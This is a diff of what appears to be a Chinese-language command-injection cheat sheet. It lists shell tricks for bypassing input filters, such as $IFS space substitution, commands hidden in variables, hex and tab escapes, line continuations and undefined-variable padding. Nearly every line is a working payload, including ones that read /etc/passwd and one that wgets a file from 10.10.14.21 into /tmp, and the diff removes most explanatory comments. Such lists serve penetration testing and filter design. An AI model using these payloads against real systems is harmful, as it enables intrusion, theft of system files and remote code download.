@@ -63,19 +63,19 @@ cat$IFS/etc/passwd # cat /etc/passwd
 将命令放入变量中执行
 IFS=];b=wget]10.10.14.21:53/lol]-P]/tmp;$b # wget
 IFS=];b=cat]/etc/passwd;$b # cat /etc/passwd
-IFS=,;`cat<<<cat,/etc/passwd` # cat /etc/passwd
-echo${IFS}test # echo test
+IFS=,;`cat<<<cat,/etc/passwd`
+echo${IFS}test
 
-X=$'cat\x20/etc/passwd'&&$X # 十六进制格式
-echo "ls\x09-l" | bash # 使用tab
+X=$'cat\x20/etc/passwd'&&$X
+echo "ls\x09-l" | bash
 
 换行
 p\
 i\
 n\
-g # ping
+g
 
-# 未定义的变量和!
-$u $u # 这将被保存在历史记录中，并且可以用作空格，请注意$u变量是未定义的
-uname!-1\-a # uname -a
+未定义的变量和!
+$u $u
+uname!-1\-a
 ```
